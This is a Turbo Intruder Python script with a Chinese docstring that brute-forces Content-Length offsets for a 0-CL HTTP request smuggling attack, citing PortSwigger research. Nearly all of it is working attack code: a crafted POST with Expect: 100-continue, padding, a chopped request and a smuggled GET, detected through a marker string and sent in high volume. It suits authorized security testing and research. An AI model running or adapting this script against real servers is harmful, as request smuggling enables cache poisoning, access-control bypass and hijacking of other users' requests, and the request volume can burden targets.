"""
0-Click偏移量查找脚本 - Turbo Intruder

功能说明：
这是一个用于查找0-Click漏洞攻击中正确偏移量的脚本。
通过暴力测试不同的Content-Length值，找到能够成功实现请求走私的精确偏移量。

重要提醒：
此方法的可靠性低于0cl-exploit脚本，仅在绝对必要时使用。
建议优先使用0cl-exploit.py进行0-Click攻击。

攻击原理：
1. 发送包含不同Content-Length值的攻击请求
2. 在请求体中填充不同长度的数据
3. 跟随一个走私请求
4. 通过响应特征判断走私是否成功
5. 确定正确的偏移量参数

技术细节：
- 使用Expect: 100-continue头部
- 动态调整Content-Length值
- 填充字符"G"来控制偏移
- 通过特征字符串"WRTZ"检测成功

使用场景：
- 0-Click漏洞偏移量暴力破解
- HTTP请求走私参数调优
- 协议解析差异测试
- 边界条件漏洞挖掘

参数配置：
- concurrentConnections: 10（高并发测试）
- requestsPerConnection: 1（每连接单请求）
- engine: Engine.THREADED（线程引擎）
- 测试范围: 1000个不同的偏移量
- 每个偏移重复: 35次

攻击组件：
1. attack: 基础攻击请求（包含Expect头部）
2. smuggled: 要走私的请求（包含特征字符串）
3. chopped: 截断的请求头部

检测机制：
- 在响应中查找"WRTZ"字符串
- 成功时自动停止攻击
- 通过标签显示成功的偏移量

安全注意：
- 此脚本会产生大量请求
- 可能对目标服务器造成负载
- 仅用于授权的安全测试
- 在隔离环境中进行测试

参考资料：
https://portswigger.net/research/http1-must-die

使用方法：
1. 修改目标域名和路径
2. 调整smuggled请求以获得可识别的响应
3. 运行脚本等待偏移量发现
4. 查看成功响应的标签获取偏移值
"""

def queueRequests(target, wordlists):
    # 创建偏移量查找引擎
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,        # 高并发测试
                           requestsPerConnection=1,          # 每连接单请求
                           engine=Engine.THREADED,           # 线程引擎
                           pipeline=False,                   # 禁用管道
                           maxRetriesPerRequest=0            # 不重试
                           )

    # 基础攻击请求（包含Expect: 100-continue）
    attack = '''POST /?ABCDEF HTTP/1.1
Host: portswigger.net
Content-Length: 123
Content-Type: application/x-www-form-urlencoded
Expect: 100-continue
Connection: keep-alive

'''

    # 调整此请求以获得可识别的响应
    smuggled = '''GET /?WRTZ HTTP/1.1
Host: portswigger.net
Connection: keep-alive

'''

    # 截断的请求头部
    chopped = '''POST / HTTP/1.1
Host: portswigger.net
Content-Length: '''+str(len(smuggled))+'''
Connection: keep-alive

'''

    # 设置偏移量测试范围
    start = len(chopped)      # 起始偏移量
    end = start + 1000        # 结束偏移量（测试1000个不同值）

    # 持续测试不同的偏移量
    while True:
        for CL in range(start, end):
            # 创建包含偏移信息的标签
            label = 'CL: '+str(CL)+' Offset: '+ str(CL - len(chopped))

            # 每个偏移量重复测试35次以提高可靠性
            for x in range(35):
                # 发送填充了"G"字符的攻击请求
                engine.queue(attack + "G"*CL, label=label)
                # 发送走私请求
                engine.queue(chopped+smuggled, label=label)

def handleResponse(req, interesting):
    # 记录所有响应用于偏移量分析
    table.add(req)

    # 检查走私响应并停止攻击
    # 当攻击停止时，查看成功响应的标签以获取偏移量
    if 'WRTZ' in req.response:  # 检测特征字符串
        print(f"发现成功的走私响应！标签: {req.label}")
        req.engine.cancel()     # 停止攻击引擎

    # 其他可能的成功指标：
    # elif req.status == 405:   # 方法不允许
    #     print(f"检测到405状态码，可能的走私成功！标签: {req.label}")
    #     req.engine.cancel()

    # 可以添加更多检测条件：
    # - 特定的错误消息
    # - 异常的响应头部
    # - 意外的状态码
    # - 响应长度异常
